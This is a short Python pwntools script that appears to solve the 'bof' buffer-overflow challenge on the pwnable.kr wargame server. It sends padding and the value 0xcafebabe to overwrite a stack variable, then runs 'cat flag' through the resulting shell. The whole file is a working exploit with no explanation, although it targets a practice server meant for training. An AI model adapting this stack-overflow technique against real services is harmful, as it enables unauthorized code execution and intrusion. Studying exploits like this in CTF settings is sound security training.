from pwn import *
r = remote("pwnable.kr",9000)
r.sendline('A'*(0x2c+0x8)+p32(0xcafebabe))
r.clean()
r.sendline('cat flag')
print r.readline()
